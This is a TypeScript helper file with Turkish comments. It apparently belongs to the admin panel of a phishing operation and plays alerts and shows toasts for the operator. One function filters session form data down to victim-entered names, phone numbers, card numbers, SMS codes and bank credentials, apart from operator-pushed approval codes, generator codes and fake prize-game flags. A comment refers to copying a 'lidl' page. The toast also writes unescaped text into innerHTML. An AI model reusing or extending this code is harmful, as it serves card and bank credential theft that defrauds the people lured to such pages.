export function playBeautifulNotification() {
  if (typeof window === "undefined") return;

  try {
    // Gerçekçi YouTube "Ding" / Resepsiyon Zili Sesi
    const audio = new Audio("/sounds/ding.mp3");
    audio.volume = 0.8;
    audio.play().catch(e => console.error("Audio play blocked by browser:", e));
  } catch (e) {
    console.error("Audio playback failed", e);
  }
}

export function showBeautifulToast(message: string, description?: string) {
  if (typeof window === "undefined") return;

  // Tailwind class'lari build-time scan disinda kalan dinamik elementlerde
  // uygulanmaz (container body's sonuna duser, sol altta serit gorunur).
  // Bu yuzden lidl'daki gibi inline style kullaniyoruz — garanti sag-ust.
  const containerId = "admin-toast-container";
  let container = document.getElementById(containerId);
  if (!container) {
    container = document.createElement("div");
    container.id = containerId;
    Object.assign(container.style, {
      position: "fixed",
      top: "24px",
      right: "24px",
      zIndex: "9999",
      display: "flex",
      flexDirection: "column",
      gap: "10px",
      pointerEvents: "none",
    });
    document.body.appendChild(container);
  }

  const toast = document.createElement("div");
  Object.assign(toast.style, {
    pointerEvents: "auto",
    display: "flex",
    alignItems: "center",
    gap: "10px",
    padding: "6px 14px 6px 6px",
    borderRadius: "999px",
    border: "1px solid rgba(255,255,255,0.10)",
    background: "rgba(42,42,42,0.92)",
    backdropFilter: "blur(16px)",
    WebkitBackdropFilter: "blur(16px)",
    boxShadow: "0 10px 40px rgba(0,0,0,0.7)",
    color: "#fff",
    minWidth: "230px",
    maxWidth: "340px",
    transform: "translateX(48px)",
    opacity: "0",
    transition: "transform 0.45s cubic-bezier(0.21,1.02,0.73,1), opacity 0.45s ease",
  });

  toast.innerHTML = `
    <div style="flex-shrink:0;width:26px;height:26px;border-radius:999px;background:rgba(235,94,40,0.18);display:flex;align-items:center;justify-content:center">
      <svg style="width:14px;height:14px;color:#EB5E28" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
      </svg>
    </div>
    <div style="flex:1;min-width:0">
      <h4 style="margin:0;font-size:12px;font-weight:700;color:#fff;letter-spacing:-0.01em">${message}</h4>
      ${description ? `<p style="margin:1px 0 0;font-size:10.5px;color:rgba(255,255,255,0.55);font-weight:500">${description}</p>` : ''}
    </div>
  `;

  container.appendChild(toast);

  // Trigger animation
  requestAnimationFrame(() => {
    toast.style.transform = "translateX(0)";
    toast.style.opacity = "1";
  });

  // Remove after 4 seconds
  setTimeout(() => {
    toast.style.transform = "translateX(48px)";
    toast.style.opacity = "0";
    setTimeout(() => {
      if (container && toast.parentNode === container) {
        container.removeChild(toast);
      }
      if (container && !container.hasChildNodes()) {
        container.remove();
      }
    }, 500);
  }, 4000);
}

/**
 * Sessions tablosundaki form_data nesnesinden sadece ve sadece
 * kullanicinin girdigi alanlari (isim, telefon, kart, SMS, banka credential vb.) suzer.
 * Admin tarafindan basilan teknik ayarlar, bildirim metinleri, sorular, generator kodlari
 * kesinlikle form verisi degisimi sayilmaz!
 */
export function extractUserFormData(data: any): Record<string, any> {
  if (!data || typeof data !== "object") return {};
  const ADMIN_KEYS = new Set([
    "generatorType",
    "generatorCode",
    "generatorLoginHistory",
    "transferApproval",
    "specialNoticeText",
    "specialNoticeImage",
    "specialNoticeLang",
    "specialNoticeSentAt",
    "customQuestionText",
    "customQuestionSentAt",
    "is_wheel_game",
    "is_win2_flow",
    "pending_profile",
    "currency",
    "bankSlug",
    "bankName",
    "partner_display_name",
    "participationCode",
    "amount",
  ]);

  const userFields: Record<string, any> = {};
  for (const [k, v] of Object.entries(data)) {
    if (ADMIN_KEYS.has(k)) continue;
    if (v === undefined || v === null || v === "") continue;

    // customQuestions: sadece kullanicinin verdigi cevap varsa dikkate al
    if (k === "customQuestions" && Array.isArray(v)) {
      const answers = v.map((item: any) => item?.answer).filter(Boolean);
      if (answers.length > 0) userFields.customQuestionsAnswers = answers;
      continue;
    }

    // generatorCurrent: sadece kullanicinin doldurdugu data nesnesi varsa dikkate al
    if (k === "generatorCurrent" && typeof v === "object") {
      const userDatas = Object.entries(v)
        .filter(([_, item]: any) => item?.data && Object.keys(item.data).length > 0)
        .map(([variant, item]: any) => ({ variant, data: item.data }));
      if (userDatas.length > 0) userFields.generatorCurrentDatas = userDatas;
      continue;
    }

    // admin prompt sifirlamalari (approvalStatus: "", approvalCode: "") atla
    if ((k === "approvalStatus" || k === "approvalCode") && !String(v).trim()) {
      continue;
    }

    userFields[k] = v;
  }
  return userFields;
}
